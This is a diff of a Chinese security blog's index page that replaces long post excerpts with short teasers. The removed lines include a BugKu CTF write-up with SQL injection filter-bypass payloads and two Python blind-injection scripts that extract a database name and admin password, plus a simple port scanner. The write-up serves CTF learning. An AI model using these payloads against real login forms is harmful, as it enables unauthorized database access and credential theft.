@@ -286,6 +286,132 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/sql注入中的绕过/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新先生">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="新先生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/sql注入中的绕过/" itemprop="url">sql注入中的绕过</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-30T16:03:02+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>sql注入绕过详解。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/30/sql注入中的绕过/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/BugKu-login3-SKCTF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -358,37 +484,14 @@
 
       
         
-          
-            <p>看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。所以我们开始注入：<br>首先我们输入admin’:<br><img src="http://i2.tiimg.com/695378/b7fb5ee5afa4b499.png" alt><br>输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。<br><strong>接着我们就需要绕过过滤字符：</strong></p>
-<p><strong>括号绕过空格：</strong></p>
-<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
-<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>例如：</p>
-<figure class="highlight plain"><figcaption><span>dual where(1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这种过滤方法常常用于time based盲注,例如：</span><br><span class="line"></span><br><span class="line">```?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>
-
-<p><strong>逗号绕过（使用from或者offset）：</strong></p>
-<p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
-<figure class="highlight plain"><figcaption><span>substr(database() from 1 for 1);```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
-
-<p><strong>等于号=：</strong><br>用&lt;&gt;(不等于)绕过。</p>
-<p>按照以上思路我们使用：</p>
-<figure class="highlight plain"><figcaption><span>from 1 for 1))```,但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">![](http://i1.fuimg.com/695378/1b7736f50af37534.png)</span><br><span class="line">如图所示，语句```ascii(substr(database()from(1)))```就可以输出数据库名第一位的ascii值</span><br><span class="line">那么思路就很清晰了，根据输入```admin&apos;^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#```，根据返回的信息，如果返回了&quot;password error!&quot; ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。</span><br><span class="line">我们写脚本爆出数据库：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.89.219.210:49167/index.php&apos;</span><br><span class="line">all_string = &apos;&apos;&apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;&apos;&apos;</span><br><span class="line">database = &apos;&apos;</span><br><span class="line">for i in range(1,11):</span><br><span class="line">    for j in all_string:</span><br><span class="line">        print(&apos;checking &apos;+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &apos;username&apos;:&quot;admin&apos;^(ascii(substr(database()from(%d)))&lt;&gt;%d)#&quot;%(i,ord(j)),</span><br><span class="line">            &apos;password&apos;:&apos;1&apos;,</span><br><span class="line">            &apos;submit&apos;:&apos;Log In&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &apos;password error!&apos; in r.text:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(&apos;the &apos;+str(i)+&apos; place of database is &apos;+j)</span><br><span class="line">            break</span><br><span class="line">    if j == &apos;M&apos; and &apos;username does not exist!&apos; in r.text:</span><br><span class="line">        break</span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://i2.tiimg.com/695378/0853845ddf830fa6.png" alt><br>本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜</p>
-<p>看别人猜的表名为admin，列名为password，真是玄学…</p>
-<p>那就直接爆password：<br>接着们爆出表：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of password is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://i1.fuimg.com/695378/2087571c3e5752d6.png" alt><br>我们可以看出爆出了密码，解密skctf123456。</p>
-<p>补充一下知识点：<br>1.ord()函数主要用来返回对应字符的ascii码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(<span class="string">"a"</span>)</span><br><span class="line"><span class="number">97</span></span><br><span class="line">&gt;&gt;&gt; chr(<span class="number">97</span>)</span><br><span class="line">&gt; <span class="string">'a</span></span><br></pre></td></tr></table></figure>
-
-<p>打印字符串</p>
-<p><code>print (“His name is %s”%(“Aviad”))</code></p>
-<p>效果：<br><img src="http://i2.tiimg.com/695378/9cef5b2b60efb76b.png" alt><br>打印整数</p>
-<p>print (“He is %d years old”%(25))</p>
-<p>效果：<br><img src="http://i2.tiimg.com/695378/e9ece54b012a24a4.png" alt></p>
-
-          
+          <p>看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/07/30/BugKu-login3-SKCTF/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -529,7 +632,7 @@
 
       
         
-          <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portScan</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">                s.connect(ip,port)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"%s  TCP port %d is open"</span>%(ip,port)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"%s  TCP port %d is close"</span>%(ip,port)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">                s.close()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">        ip=<span class="string">'192.168.19.1'</span></span><br><span class="line">        port=<span class="number">8888888</span></span><br><span class="line">        portScan(ip,port)</span><br></pre></td></tr></table></figure>
+          <p>python脚本编写</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/07/29/python-scoket主机识别/#more" rel="contents">
@@ -677,9 +780,7 @@
 
       
         
-          <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a><strong>基础知识</strong></h3><hr>
-<hr>
-<h4 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a><strong>XML基础知识</strong></h4><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。—-看了之后是不是很牛逼？高大上？其实百分之99的人看不懂。下面来点通俗的讲解：<br>      简单概括的话就是，xml本身是一种格式规范，是一种包含了数据以及数据说明的文本格式规范。<br>比如，我们要给对方传输一段数据，数据内容是“too young,too simple,sometimes naive”，要将这段话按照属性拆分为三个数据的话，就是，年龄too young，阅历too simple，结果sometimes naive。</p>
+          <p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/07/29/xxe漏洞详解/#more" rel="contents">
@@ -828,9 +929,6 @@
       
         
           <p>面对这道题我完全小白，所以我必须详细解释。</p>
-<hr>
-<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><hr>
-<h4 id="什么是php框架？"><a href="#什么是php框架？" class="headerlink" title="什么是php框架？"></a><strong>什么是php框架？</strong></h4><p>框架思想就是提供一种可以在多个应用程序中使用的设计。所有应用程序都有大量通用的基本内容 —— 具体地说，就是某类与数据库的接口、某些应用程序逻辑、应用程序呈现给用户的内容等。如果您编写过许多 PHP 应用程序，则会知道这些基本内容是什么。您可能已经编写过一组函数或从数据库中读取数据和向数据库中写入数据的类，可能已经使用过诸如 Smarty 之类的模板引擎来管理 UI。而且一定编写过大量 PHP 代码来完成诸如分析表单提交并根据提交的数据作决定之类的事务。如果您已经编写过很多应用程序，则可能已经一次又一次地做过相同的基本工作，有时还会将一个应用程序中的代码借用到另一个应用程序中。<br>　　框架专门用于为这些常用元素(数据库交互、表示层、应用程序逻辑)提供结构，以便您可以花费更少的时间来编写数据库接口代码或者表示层接口，而花费更多的时间来编写应用程序本身。以这种方式分解应用程序，这种架构被称为模型-视图-控制器(Model-View-Controller，MVC)。模型 指数据，视图 指表示层，而控制器 指应用程序逻辑或业务逻辑。对 MVC 的完整讨论超出本文的范围，但是鼓励您研究 MVC 并深入了解 MVC 的一切(请参阅 参考资料)。<br>　　选择框架<br>　　每种语言几乎都有若干个框架可用。选择刚好满足需求的框架可能有点难，尤其是当您以前未曾使用过任何一个框架时更是如此。虽然熟悉此领域的同事和可信赖的 developerWorks 作者提供的建议和评价会十分有帮助，但是选择任何框架时实际上应当遵循的惟一一个指导原则是：框架为每个人 节省的时间和精力越多越好。如果一个框架工作得很好但是会导致产生大量支持调用，那就不是一个优秀框架。如果一个框架易于支持，但是起到的阻碍作用大于辅助开发作用，那也不是一个优秀框架。如果一个框架十分优雅，但是会导致出现支持问题和开发问题，那么这个框架也是没有用的。</p>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/07/29/Jarvis-OJ-api调用/#more" rel="contents">
@@ -979,9 +1077,6 @@
       
         
           <p>查看源码发现index.phps文件，打开开始代码审计</p>
-<hr>
-<hr>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/07/27/Jarvis-OJ-IN-A-Mess/#more" rel="contents">
@@ -1068,7 +1163,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1090,7 +1185,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
